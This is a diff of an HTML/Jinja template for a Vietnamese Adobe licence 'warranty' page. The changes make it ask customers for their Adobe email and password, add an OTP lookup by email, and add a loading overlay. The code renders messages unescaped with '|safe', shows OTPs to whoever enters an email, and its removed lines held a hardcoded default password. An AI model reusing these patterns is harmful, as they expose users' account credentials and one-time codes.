@@ -64,7 +64,8 @@
             transition: all 0.3s;
         }
         
-        input[type="text"] {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 2px solid #e0e0e0;
@@ -74,7 +75,8 @@
         }
         
         input[type="email"]:focus,
-        input[type="text"]:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             outline: none;
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
@@ -161,37 +163,134 @@
         .back-link:hover {
             text-decoration: underline;
         }
+        /* Loading overlay styles */
+        .overlay {
+            position: fixed;
+            inset: 0; /* top:0; right:0; bottom:0; left:0; */
+            background: rgba(0,0,0,0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        .overlay.active {
+            display: flex;
+            pointer-events: auto; /* block interactions behind */
+        }
+
+        .overlay .card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px 28px;
+            max-width: 520px;
+            width: calc(100% - 40px);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+        }
+
+        .overlay h2 {
+            margin-bottom: 10px;
+            color: #333;
+            font-size: 20px;
+        }
+
+        /* Important note / screenshot styles */
+        .important-note {
+            background: #fff8e6;
+            border-left: 4px solid #ffb74d;
+            padding: 14px 16px;
+            border-radius: 10px;
+            margin-bottom: 18px;
+            color: #3a3a3a;
+        }
+
+        .important-note h3 {
+            margin: 0 0 6px 0;
+            font-size: 15px;
+            color: #333;
+        }
+
+
+        .overlay p {
+            color: #444;
+            margin-bottom: 8px;
+            line-height: 1.4;
+            font-size: 15px;
+        }
+
+        /* Simple spinner */
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 5px solid #e6e6e6;
+            border-top-color: #667eea;
+            animation: spin 1s linear infinite;
+            margin: 14px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔧 Bảo hành Adobe</h1>
-        <p class="subtitle">Tạo tài khoản mới và thêm vào Admin Console</p>
+        <p class="subtitle">Bảo hành, add lại bản quyền vào tài khoản lỗi</p>
+
+        <div class="important-note" role="note" aria-live="polite">
+            <h3>Lưu ý quan trọng: bạn phải xác thực email trước khi bảo hành</h3>
+            <p style="margin:0; color:#444; font-size:14px;">
+                Để kiểm tra email đã xác thực chưa, vào
+                <a href="https://account.adobe.com/profile" target="_blank" rel="noopener noreferrer">https://account.adobe.com/profile</a>, nhìn dòng
+                <strong>Primary email (Adobe ID)</strong>.
+            </p>
+            <p style="margin:0; color:#444; font-size:14px;">
+                Nếu thấy chữ <em>Verified</em> bên dưới email, tức là đã xác thực. Nếu không có, bạn cần xác thực email trước khi bảo hành.
+            </p>
+        </div>
         
         {% if message %}
         <div class="message {% if '✓' in message %}success{% else %}error{% endif %}">
-            {{ message }}
+            {{ message|safe }}
         </div>
         {% endif %}
         
         <form method="POST" action="/baohanh">
             <div class="form-group">
-                <label for="email">Email khách hàng:</label>
+                <label for="email">Email Adobe của bạn:</label>
                 <input 
                     type="email" 
                     id="email" 
                     name="email" 
-                    placeholder="example@email.com"
+                    placeholder="example@gmail.com"
                     required
                     autofocus
                 >
                 <small style="color: #999; display: block; margin-top: 5px;">
-                    Email này sẽ được tạo tài khoản Adobe mới với password: Adobe@123
+                    Tài khoản mà bạn đang sử dụng bị lỗi.
                 </small>
             </div>
+
+            <div class="form-group">
+                <label for="password">Mật khẩu:</label>
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Nhập mật khẩu tài khoản Adobe của bạn"
+                    required
+                >
+            </div>
             
+            <!-- client-side inline error message -->
+            <div id="client-error" class="message error" style="display:none; margin-bottom:16px;"></div>
+
             <button type="submit" class="btn">
-                Tạo tài khoản và thêm vào Admin Console
+                Bảo hành
             </button>
         </form>
         
@@ -216,7 +315,110 @@
         </div>
         {% endif %}
         
-        <a href="/" class="back-link">← Quay về trang chủ</a>
+                <a href="/" class="back-link">← Quay về trang chủ</a>
+
+                <!-- Centered panel under Bảo hành Adobe containing OTP lookup and search -->
+                <div style="width:100%; display:flex; justify-content:center; margin-top:18px;">
+                    <div style="max-width:460px; width:100%; background:transparent;">
+                        <!-- OTP lookup -->
+                        <form action="/otp" method="POST" style="display:flex; gap:8px; align-items:center;">
+                            <input type="email" name="email_otp" placeholder="Nhập email để lấy OTP" required style="flex:1; padding:10px 12px; border-radius:8px; border:1px solid #ddd;">
+                            <button type="submit" class="btn" style="width:auto; padding:10px 14px; border-radius:8px;">Lấy OTP</button>
+                        </form>
+                        {% if session.get('otp') %}
+                            <div class="message success" style="margin-top:10px;">
+                                {{ session.get('otp') }}
+                            </div>
+                        {% endif %}
+
+                        <!-- Search card (kept small and centered) -->
+                        <div style="margin-top:12px; background:#fff; border-radius:10px; padding:12px; box-shadow:0 6px 18px rgba(0,0,0,0.06);">
+                            <form action="{{ url_for('search') }}" method="POST">
+                                <div style="margin-bottom:10px;">
+                                    <label for="email_search" class="form-label">Nhập Email</label>
+                                    <input type="email" id="email_search" name="email" placeholder="Nhập email" required style="width:100%; padding:10px 12px; border-radius:8px; border:1px solid #ddd;">
+                                </div>
+                                <button type="submit" class="btn">Tìm Kiếm</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+        </div>
+    <!-- Loading overlay (shown on form submit) -->
+    <div id="loading-overlay" class="overlay" role="status" aria-hidden="true" aria-live="polite">
+        <div class="card" onclick="event.stopPropagation();">
+            <div class="spinner" aria-hidden="true"></div>
+            <h2>Đang thực hiện bảo hành</h2>
+            <p>Đang thực hiện bảo hành, thời gian dự kiến 5 phút</p>
+            <p>Vui lòng không tắt tab này để tránh các vấn đề phát sinh khác</p>
+            <p><strong>Cảm ơn bạn đã kiên nhẫn</strong></p>
+        </div>
     </div>
+
+    <script>
+        (function() {
+            var form = document.querySelector('form');
+            var overlay = document.getElementById('loading-overlay');
+
+            function showOverlay() {
+                if (!overlay) return;
+                overlay.classList.add('active');
+                overlay.setAttribute('aria-hidden', 'false');
+
+                // Delay disabling controls so the browser can serialize their values
+                // during the current submission. Disabling immediately in the submit
+                // event can remove them from the form data in some browsers.
+                setTimeout(function() {
+                    var controls = form.querySelectorAll('input, button, select, textarea');
+                    controls.forEach(function(el) {
+                        el.disabled = true;
+                    });
+                }, 50);
+            }
+
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    var emailEl = form.querySelector('[name="email"]');
+                    var passEl = form.querySelector('[name="password"]');
+                    var clientError = document.getElementById('client-error');
+                    var email = emailEl ? emailEl.value.trim() : '';
+                    var pass = passEl ? passEl.value.trim() : '';
+
+                    // Client-side required validation with Vietnamese messages
+                    if (!email || !pass) {
+                        e.preventDefault();
+                        if (clientError) {
+                            if (!email && !pass) {
+                                clientError.textContent = 'Vui lòng nhập email và mật khẩu';
+                            } else if (!email) {
+                                clientError.textContent = 'Vui lòng nhập email';
+                            } else {
+                                clientError.textContent = 'Vui lòng nhập mật khẩu';
+                            }
+                            clientError.style.display = 'block';
+                        } else {
+                            alert(!email ? 'Vui lòng nhập email' : 'Vui lòng nhập mật khẩu');
+                        }
+                        // focus first empty
+                        if (!email && emailEl) emailEl.focus();
+                        else if (!pass && passEl) passEl.focus();
+                        return;
+                    }
+
+                    // hide client error and proceed
+                    if (clientError) clientError.style.display = 'none';
+                    showOverlay();
+                });
+            }
+
+            // Safety: if the page navigates back via history and overlay is still active,
+            // hide it once DOM is interactive again.
+            window.addEventListener('pageshow', function() {
+                if (overlay && overlay.classList.contains('active')) {
+                    // keep showing only if navigation is still in progress; we don't auto-hide
+                }
+            });
+        })();
+    </script>
 </body>
 </html>
